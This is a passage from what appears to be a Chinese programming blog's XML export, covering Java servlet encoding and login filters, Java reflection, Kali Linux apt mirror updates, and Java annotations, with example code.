<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--只要是经过/的请求,都会经过这个过滤器--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>CharacterEncodingFilter.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CharacterEncodingFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//初始化</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="comment">//filterChain:链的意思,一边出一边进,这样就可以使用多个过滤器串联起来</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        servletRequest.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        servletResponse.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br><span class="line">        servletResponse.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);<span class="comment">//让请求继续走,不写程序就会在这里停止</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220116223839656.png" alt="image-20220116223839656"></p>
<p>没过滤之前乱码</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220116223824121.png" alt="image-20220116223824121"></p>
<p>过滤后</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220116223932653.png" alt="image-20220116223932653"></p>
<h3 id="监听器"><a href="#监听器" class="headerlink" title="监听器"></a>监听器</h3><p>实现一个监听器的接口,有很多种,具体具体实现,和filter设置</p>
<p>1.编写一个监听器</p>
<ul>
<li>实现监听器接口</li>
</ul>
<p>2.web.xml中配置监听器</p>
<p>3.看情况是否使用</p>
<h3 id="过滤器应用"><a href="#过滤器应用" class="headerlink" title="过滤器应用"></a>过滤器应用</h3><p>比如是否已经登录成功的校验,这样在访问网站需要登录才能访问的资源时,会经过一次loginFilter来校验,并决定是否允许其访问,这样在每次访问对应页面时候,就不用重复写校验是否已经登录的代码了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">loginFilter</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        <span class="comment">//servletrequest拿不到session,做类型转换,转换成它爹httpservletrequest,response同理</span></span><br><span class="line">        HttpServletRequest request=(HttpServletRequest) servletRequest;</span><br><span class="line">        HttpServletResponse response=(HttpServletResponse) servletResponse;</span><br><span class="line">        <span class="keyword">if</span>(request.getSession().getAttribute(<span class="string">&quot;USER_SESSION&quot;</span>)==<span class="keyword">null</span>)&#123;</span><br><span class="line">            response.sendRedirect(<span class="string">&quot;/error.jsp&quot;</span>);</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            filterChain.doFilter(request,response);<span class="comment">//已经登录则将请求传递下去给</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java_web</tag>
      </tags>
  </entry>
  <entry>
    <title>java反射</title>
    <url>/2022/01/11/java%E5%8F%8D%E5%B0%84/</url>
    <content><![CDATA[<p>先认识一下动态和静态语言<span id="more"></span></p>
<p><strong>反射的一个特点:破坏封装</strong></p>
<h4 id="动态语言"><a href="#动态语言" class="headerlink" title="动态语言"></a>动态语言</h4><p>是一类在运行时可以改变其结构的语言:例如新的函数,对象,甚至代码可以被引进,已有的函数可以被删除或是其他结构上的变化,通俗点说就是在运行时代码可以 根据某些条件改变自身结构</p>
<p>主要动态语言:c#,javaScript,PHP,Python等</p>
<h4 id="静态语言"><a href="#静态语言" class="headerlink" title="静态语言"></a>静态语言</h4><p>与动态语言相对应的,运行时结构不可改变的语言就是静态语言,不如java,c,c++</p>
<p>java不是动态语言,但是java可以称之为”准动态语言”,即java有一定的动态性,我们可以<label style="background:yellow">利用反射机制获得类似动态语言的特性</label>,java的动态性让编程的时候更加灵活</p>
<h2 id="java反射"><a href="#java反射" class="headerlink" title="java反射"></a>java反射</h2><p><strong>通俗讲就是可以通过对象找到它的类</strong></p>
<p>reflection是java被视为动态语言的关键,反射机制允许程序在执行期间借助于Reflection API取得任何类的内部信息,并能直接操作任意对象的内部属性及方法</p>
<p><code>Class c=Class.forName(&quot;java.lang.String&quot;)</code></p>
<p>加载完类之后,在堆内存的方法区中就产生了一个Class类型的对象(一个类只有一个Class对象),这个对象就<label style="background:yellow">包含了完整的类的结构信息</label>,我们可以通过这个对象看到类的结构,这个对象就像一面镜子,透过这个镜子看到类的结构,所以,它被形象的称之为反射</p>
<p>正常方式:    <code>引入需要的&quot;包类&quot;名称</code>—&gt;<code>通过new实例化</code>—&gt;<code>取得实例化对象</code></p>
<p>反射方式:    <code>实例化对象</code>—–&gt;<code>getClass()方法</code>—–&gt;<code>得到完整的&quot;包类&quot;名称</code></p>
<h4 id="反射相关的主要API"><a href="#反射相关的主要API" class="headerlink" title="反射相关的主要API"></a>反射相关的主要API</h4><ul>
<li>java.lang.Class  代表一个类</li>
<li>java.lang.reflect.Method  代表类的方法</li>
<li>java.lang.reflect.Field  代表类的成员变量</li>
<li>java.lang.reflect.Constructor  代表类的构造器</li>
<li>java.lang.reflect.Annotation 类表示注解</li>
<li>……………</li>
</ul>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220228144001904.png" alt="image-20220228144001904"></p>
<h4 id="Class类"><a href="#Class类" class="headerlink" title="Class类"></a>Class类</h4><p>对于每个类而言,JRE都为其保留了一个不变的Class类型的对象,一个Class对象包含了特定某个结构的所有信息</p>
<ul>
<li>Class本身也是一个类</li>
<li>Class对象只能由系统建立对象</li>
<li>一个加载的类在JVM中只会有一个Class实例</li>
<li>一个Class对象对应的是一个加载到JVM中的一个class文件</li>
<li>每个类的实例都会记得自己是由哪个Class实例所生成</li>
<li>通过Class可以完整地得到一个类中的所有被夹在的结构</li>
<li>Class类是Reflection的根源,针对任何你想动态加载,运行的类,唯有先获得相应的Class对象</li>
</ul>
<h4 id="获取Class类的方法"><a href="#获取Class类的方法" class="headerlink" title="获取Class类的方法"></a>获取Class类的方法</h4><p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220111164508670.png" alt="image-20220111164508670"></p>
<p>此时hashCode相等,说明三种方法获得的都是同一个class</p>
<p>还有一个方式四,但是只能获得基本内置类型</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class c4 = Integer.TYPE;</span><br></pre></td></tr></table></figure>

<p>还可以通过getSuperclass()获得父类的Class对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class c5 = c1.getSuperclass;</span><br></pre></td></tr></table></figure>

<p>方法还有……….</p>
<h5 id="所有类型的Class对象"><a href="#所有类型的Class对象" class="headerlink" title="所有类型的Class对象"></a>所有类型的Class对象</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.ElementType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Class c1=Object.class;<span class="comment">//类</span></span><br><span class="line">        Class c2=Comparable.class;<span class="comment">//接口</span></span><br><span class="line">        Class c3=String[].class;<span class="comment">//一维数组</span></span><br><span class="line">        Class c4=<span class="keyword">int</span>[][].class;<span class="comment">//二维数组</span></span><br><span class="line">        Class c5=Override.class;<span class="comment">//注解</span></span><br><span class="line">        Class c6= ElementType.class;<span class="comment">//枚举</span></span><br><span class="line">        Class c7=Integer.class;<span class="comment">//基本数据类型</span></span><br><span class="line">        Class c8=<span class="keyword">void</span>.class;<span class="comment">//void</span></span><br><span class="line">        Class c9=Class.class;<span class="comment">//class</span></span><br><span class="line">        System.out.println(c1);</span><br><span class="line">        System.out.println(c2);</span><br><span class="line">        System.out.println(c3);</span><br><span class="line">        System.out.println(c4);</span><br><span class="line">        System.out.println(c5);</span><br><span class="line">        System.out.println(c6);</span><br><span class="line">        System.out.println(c7);</span><br><span class="line">        System.out.println(c8);</span><br><span class="line">        System.out.println(c9);</span><br><span class="line">        <span class="keyword">int</span>[] a=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">10</span>];</span><br><span class="line">        <span class="keyword">int</span>[] b=<span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">100</span>];</span><br><span class="line">        <span class="keyword">int</span>[][] c=<span class="keyword">new</span> <span class="keyword">int</span> [<span class="number">10</span>][<span class="number">10</span>];</span><br><span class="line">        System.out.println(a.getClass().hashCode());</span><br><span class="line">        System.out.println(b.getClass().hashCode());</span><br><span class="line">        System.out.println(c.getClass().hashCode());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><label style="background:yellow">只要元素类型与维度一样,就是同一个Class</label></p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220111170812325.png" alt="image-20220111170812325" style="zoom:80%;" />

<h4 id="类加载内存分析"><a href="#类加载内存分析" class="headerlink" title="类加载内存分析"></a>类加载内存分析</h4><h5 id="java内存"><a href="#java内存" class="headerlink" title="java内存"></a>java内存</h5><ol>
<li>堆</li>
</ol>
<ul>
<li><p>存放new的对象和数组</p>
</li>
<li><p>可以被所有线程共享,不会存放别的对象引用</p>
</li>
</ul>
<ol start="2">
<li>栈</li>
</ol>
<ul>
<li><p>存放基本变量类型(会包含这个基本类型的具体数值)</p>
</li>
<li><p>引用对象的变量(会存放这个引用在堆里面的具体地址)</p>
</li>
</ul>
<ol start="3">
<li>方法区</li>
</ol>
<ul>
<li>可以被所有的线程共享</li>
<li>包含了所有的class和static变量</li>
</ul>
<h3 id="反射能做什么"><a href="#反射能做什么" class="headerlink" title="反射能做什么"></a>反射能做什么</h3><ul>
<li>在运行时判断任意一个对象所属的类</li>
<li>在运行时判断任意一个对象所属的类</li>
<li>在运行时构造任意一个类的对象</li>
<li>在运行时判断任意一个类所具有的成员变量和方法</li>
<li>在运行时调用任意一个对象的方法</li>
<li>生成动态代理</li>
</ul>
<h3 id="获取类对象的对象有三种"><a href="#获取类对象的对象有三种" class="headerlink" title="获取类对象的对象有三种"></a>获取类对象的对象有三种</h3><ul>
<li>类.class</li>
<li>obj.getClass()     //通过对象的方式获取类对象</li>
</ul>
<p>Cat cat=new Cat();</p>
<p>Class&lt;? extends Cat&gt; catClass = cat.getClass(); </p>
<ul>
<li>Class.forName(“类的名字”)</li>
</ul>
<p>读取properties配置文件工具类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.util.Properties;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">PropUtils</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Properties p= <span class="keyword">new</span> Properties();</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            p.load(PropUtils.class.getClassLoader().getResourceAsStream(<span class="string">&quot;object.properties&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ExceptionInInitializerError(<span class="string">&quot;加载配置文件失败&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">getProperty</span><span class="params">(String key)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> p.getProperty(key);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class&lt;?&gt; clz=Class.forName(PropUtils.getProperty(<span class="string">&quot;animal&quot;</span>));</span><br><span class="line">        Constructor&lt;?&gt; constructor = clz.getConstructor();</span><br><span class="line">        Animal anl=(Animal) constructor.newInstance();</span><br><span class="line">        anl.call();</span><br></pre></td></tr></table></figure>

<p>类对象:是类加载的产物</p>
<p>类加载:JVM第一次读取一个类的时候,将类的字节码文件加载到内存的过程</p>
<h4 id="获取类中的属性"><a href="#获取类中的属性" class="headerlink" title="获取类中的属性"></a>获取类中的属性</h4><p>getFields()//获取公开的属性,包括父类中的公开属性</p>
<p>getDeclaredField()//获取声明的所有属性,不包含父类中定义的属性</p>
<p>getField()//获取指定的公开属性</p>
<p>getDeclaredField()//获取声明的所有属性,但是不包过父类中定义的属性</p>
<h4 id="修改对象中的值"><a href="#修改对象中的值" class="headerlink" title="修改对象中的值"></a>修改对象中的值</h4><p>通过属性去操作对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Cat cat=<span class="keyword">new</span> Cat();</span><br><span class="line">        Class&lt;? extends Cat&gt; catClass = cat.getClass();</span><br><span class="line">        Field f = catClass.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        f.set(cat,<span class="string">&quot;小白&quot;</span>);</span><br><span class="line">        System.out.println(cat.name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>并且也能修改私有属性,只需要添加一段代码  <code>f.setAccessible(true);</code>即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Cat cat=<span class="keyword">new</span> Cat();</span><br><span class="line">        Class&lt;? extends Cat&gt; catClass = cat.getClass();</span><br><span class="line">        Field f = catClass.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        f.set(cat,<span class="string">&quot;小白&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(cat.getName());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<p>将给定的Map通过反射转换成一个对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testMap</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Map&lt;String,Object&gt; map=<span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;小白&quot;</span>);</span><br><span class="line">        map.put(<span class="string">&quot;age&quot;</span>,<span class="number">2</span>);</span><br><span class="line">        map.put(<span class="string">&quot;type&quot;</span>,<span class="string">&quot;加菲猫&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;Cat&gt; catClass = Cat.class;</span><br><span class="line">        <span class="comment">//获取所有属性</span></span><br><span class="line">        Field[] declaredFields = catClass.getDeclaredFields();</span><br><span class="line">        <span class="comment">//获取父类中定义的属性</span></span><br><span class="line">        Field[] declaredFields1 = catClass.getSuperclass().getDeclaredFields();</span><br><span class="line">        <span class="comment">//合并两个类的所有属性</span></span><br><span class="line">        List&lt;Field&gt; collect = Arrays.stream(declaredFields).collect(Collectors.toList());</span><br><span class="line">        List&lt;Field&gt; collect1 = Arrays.stream(declaredFields1).collect(Collectors.toList());</span><br><span class="line">        collect.addAll(collect1);</span><br><span class="line">        <span class="comment">//遍历所有的field</span></span><br><span class="line">        Cat cat=<span class="keyword">new</span> Cat();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (Field f:collect</span><br><span class="line">             ) &#123;</span><br><span class="line">            <span class="keyword">if</span>(map.containsKey(f.getName()))&#123;</span><br><span class="line">                f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                f.set(cat,map.get(f.getName()));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(cat);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="获取类的构造方法"><a href="#获取类的构造方法" class="headerlink" title="获取类的构造方法"></a>获取类的构造方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getConstructor</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;Dog&gt; dogClass = Dog.class;</span><br><span class="line">        <span class="comment">//获取无参构造方法</span></span><br><span class="line">        Constructor&lt;Dog&gt; declaredConstructor = dogClass.getDeclaredConstructor();</span><br><span class="line">        <span class="comment">//破坏封装</span></span><br><span class="line">        declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">//调用无参构造方法</span></span><br><span class="line">        Dog dog = declaredConstructor.newInstance();</span><br><span class="line">        System.out.println(dog);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//调用指定的有参构造方法,根据参数类型去获取</span></span><br><span class="line">        Constructor&lt;Dog&gt; declaredConstructor1 = dogClass.getDeclaredConstructor(String.class);</span><br><span class="line">        Dog dog1 = declaredConstructor1.newInstance(<span class="string">&quot;小狗&quot;</span>);</span><br><span class="line">        System.out.println(dog1);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="获取类的方法"><a href="#获取类的方法" class="headerlink" title="获取类的方法"></a>获取类的方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getMethod</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Class&lt;Dog&gt; dogClass = Dog.class;</span><br><span class="line">        <span class="comment">//获取该类中所有的公开的方法,包含继承的</span></span><br><span class="line">        Method[] methods = dogClass.getMethods();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取当前类自己声明的所有方法</span></span><br><span class="line"></span><br><span class="line">        Method[] declaredMethods = dogClass.getDeclaredMethods();</span><br><span class="line">        System.out.println(Arrays.toString(declaredMethods));</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取properties配置文件中指定的方法</span></span><br><span class="line">        String methodName = PropUtils.getProperty(<span class="string">&quot;methodName&quot;</span>);</span><br><span class="line">        Method declaredMethod = dogClass.getDeclaredMethod(methodName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取方法修饰符</span></span><br><span class="line">        <span class="keyword">int</span> modifiers = declaredMethod.getModifiers();<span class="comment">//什么都不加 是0 ， public  是1 ，private 是 2 ，protected 是 4，static 是 8 ，final 是 16。</span></span><br><span class="line">        <span class="comment">//获取方法返回值</span></span><br><span class="line">        Class&lt;?&gt; returnType = declaredMethod.getReturnType();</span><br><span class="line">        System.out.println(returnType);</span><br><span class="line">        <span class="comment">//还能获取异常类型...方法参数...</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">//通过反射创建该类的对象</span></span><br><span class="line">        Dog dog = dogClass.getDeclaredConstructor().newInstance();</span><br><span class="line"></span><br><span class="line">        declaredMethod.invoke(dog);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//执行带有参数的方法</span></span><br><span class="line">        Method eat = dogClass.getDeclaredMethod(<span class="string">&quot;eat&quot;</span>, String.class);</span><br><span class="line">        eat.invoke(dog,<span class="string">&quot;饼干&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>reflection</tag>
      </tags>
  </entry>
  <entry>
    <title>kali更新</title>
    <url>/2021/01/13/kali%E6%9B%B4%E6%96%B0/</url>
    <content><![CDATA[<p>kali更新依次使用即可更新前先更换源/etc/apt/sources.list</p>
<ul>
<li>中科大</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<ul>
<li>阿里云</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br><span class="line">deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib</span><br></pre></td></tr></table></figure>

<ul>
<li>清华大学</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br><span class="line">deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free</span><br></pre></td></tr></table></figure>

<p>apt-get update &amp; apt-get upgrade当出现正在读取软件包列表 . . .完成 ，画面长时间未变动时，回车执行下一条语句（若如正常执行完毕更好）</p>
<p>apt-get dist-upgrade在执行即将结束时会有一次选择，选择是否选择安装新的还是维持旧的，输入Y，安装新的。结束后安装完毕，可再一次执行第一条命令，检查是否所有的安装包是否全部安装。</p>
<p>apt-get clean此时已经全部安装完毕，执行下面的命令(可复制)可查看新系统版本<br>查看系统版本 命令：lsb_release -a</p>
<p>查看内核版本 命令：uname -r</p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>kail</tag>
      </tags>
  </entry>
  <entry>
    <title>java注解</title>
    <url>/2022/01/11/java%E6%B3%A8%E8%A7%A3/</url>
    <content><![CDATA[<h2 id="注解-Annotation"><a href="#注解-Annotation" class="headerlink" title="注解(Annotation)"></a>注解(Annotation)</h2><span id="more"></span>

<h3 id="注解简介"><a href="#注解简介" class="headerlink" title="注解简介"></a>注解简介</h3><h5 id="注解的作用"><a href="#注解的作用" class="headerlink" title="注解的作用:"></a>注解的作用:</h5><ul>
<li>不是程序本身,可以对程序做出解释,也能对程序的正确性进行矫正(比如写了@Override就要重写)</li>
<li>可以被其他程序(比如编译器等)读取</li>
</ul>
<h5 id="注解的格式"><a href="#注解的格式" class="headerlink" title="注解的格式:"></a>注解的格式:</h5><p>注解是以”@注解名”在代码中存在的,还可以添加一些参数值,例如:@SuppressWarnings(Value=”unchecked”)</p>
<h5 id="注解在哪里使用"><a href="#注解在哪里使用" class="headerlink" title="注解在哪里使用"></a>注解在哪里使用</h5><p>可以附加在package,class,method,field等上面,相当于给他们添加了额外的辅助信息,我们可以通过反射机制编程实现对这些元数据的访问</p>
<h3 id="内置注解"><a href="#内置注解" class="headerlink" title="内置注解"></a>内置注解</h3><h5 id="Override"><a href="#Override" class="headerlink" title="@Override"></a>@Override</h5><p>定义在java.long.Override中,用于修饰方法,表示一个方法声明打算重写</p>
<h5 id="Deprecated"><a href="#Deprecated" class="headerlink" title="@Deprecated"></a>@Deprecated</h5><p>定义在java.long.Deprecated中,此注释可以用于修饰方法,属性类,表示不鼓励程序员使用这一的元素,通过是一万年它很危险或者存在更好的选择</p>
<h5 id="SuppressWarnings"><a href="#SuppressWarnings" class="headerlink" title="@SuppressWarnings"></a>@SuppressWarnings</h5><p>定义在java.long.SuppressWarnings中,用来抑制编译时的警告信息,它需要添加一个参数才能使用</p>
<p>例如:</p>
<ul>
<li><p>@SuppressWarnings(“all”)</p>
</li>
<li><p>@SuppressWarnings(“unchecked”)</p>
</li>
<li><p>@SuppressWarnings(value={“unchecked”,”deprecation”})</p>
</li>
</ul>
<p>能传递多个参数源自于其源码中的最后一行</p>
<img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220111133538313.png" alt="image-20220111133538313" style="zoom:80%;" />

<ul>
<li>…….</li>
</ul>
<h3 id="元注解"><a href="#元注解" class="headerlink" title="元注解"></a>元注解</h3><p>元注解的作用就是解释其他注解,java定义了四个标准的元注解(meta_annotation)</p>
<ul>
<li>@Target </li>
</ul>
<p>用于表示注解的使用范围</p>
<p>​                              @Target(ElementType.TYPE)   //接口、类、枚举</p>
<p>　　　　　　　　@Target(ElementType.FIELD) //字段、枚举的常量</p>
<p>　　　　　　　　@Target(ElementType.METHOD) //方法</p>
<p>　　　　　　　　@Target(ElementType.PARAMETER) //方法参数</p>
<p>　　　　　　　　@Target(ElementType.CONSTRUCTOR)  //构造函数</p>
<p>　　　　　　　　@Target(ElementType.LOCAL_VARIABLE)//局部变量</p>
<p>　　　　　　　　@Target(ElementType.ANNOTATION_TYPE)//注解</p>
<p>　　　　　　　　@Target(ElementType.PACKAGE) ///包   </p>
<ul>
<li>@Retention</li>
</ul>
<p>表示需要在什么级别保存该注释信息,用于描述注解的声明周期</p>
<p>Runtime&gt;class&gt;source</p>
<ul>
<li>@Documented</li>
</ul>
<p>说明该注解将被包含在javadoc中</p>
<ul>
<li>@Inherited</li>
</ul>
<p>说明子类可以继承父类中的该注解</p>
<h3 id="自定义注解"><a href="#自定义注解" class="headerlink" title="自定义注解"></a>自定义注解</h3><p>使用@interface自定义注解,自动继承java.lang.annotation.Annotation接口</p>
<ul>
<li>格式</li>
</ul>
<p>public @ interface 注解名 {定义内容}</p>
<ul>
<li><p>其中的每一个方法实际上是声明了一个配置参数</p>
</li>
<li><p>方法的名称就是参数的名称</p>
</li>
<li><p>返回值类型就是参数的类型(返回值只能是Class,String,enum)</p>
</li>
<li><p>可以通过default来声明参数的默认值</p>
</li>
<li><p>如果只有一个参数成员,一般参数名为value<label style="color:red">(value参数可以省略传参)</label></p>
</li>
<li><p>注解元素必须要有值,我们定义注解元素时,经常使用空字符串,0作为默认值</p>
</li>
</ul>
